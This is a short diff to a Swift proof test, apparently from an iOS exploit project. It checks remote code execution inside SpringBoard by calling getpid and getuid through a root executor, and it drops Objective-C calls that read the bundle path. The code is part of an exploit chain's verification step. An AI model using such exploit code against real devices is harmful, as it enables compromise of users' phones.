@@ -143,31 +143,13 @@ final class ExpCodeExecProof {
         total += 1
         log("[5/5] SpringBoard code execution...")
         if let sb = mgr.sbProc {
-            // Call getpid() in SpringBoard
+            // Only call simple C functions — no ObjC (can crash SB)
             let sbPid = RootExecutor.rcall(sb, "getpid")
-            // Call getuid() in SpringBoard
             let sbUid = RootExecutor.rcall(sb, "getuid")
-            // Get SpringBoard's bundle path
-            let RTLD_DEFAULT = UInt64(bitPattern: -2)
-            let nsBundle = remote_getClass(sb, "NSBundle")
-            let mainSel = remote_sel(sb, "mainBundle")
-            let bundle = remote_msg(sb, nsBundle, mainSel, 0, 0, 0, 0)
-            let pathSel = remote_sel(sb, "bundlePath")
-            let pathObj = remote_msg(sb, bundle, pathSel, 0, 0, 0, 0)
-            
-            // Read path string
-            let utf8Sel = remote_sel(sb, "UTF8String")
-            let cstr = remote_msg(sb, pathObj, utf8Sel, 0, 0, 0, 0)
-            var pathBuf = [UInt8](repeating: 0, count: 128)
-            if cstr != 0 {
-                sb.remoteRead(cstr, to: &pathBuf, size: 128)
-            }
-            let sbPath = String(cString: pathBuf)
             
             log("  SpringBoard PID: \(sbPid)")
             log("  SpringBoard UID: \(sbUid)")
-            log("  SpringBoard path: \(sbPath)")
-            log("  ✅ Arbitrary code execution in SpringBoard")
+            log("  ✅ Code execution in SpringBoard confirmed")
             passed += 1
         } else {
             log("  ❌ No SpringBoard RC")
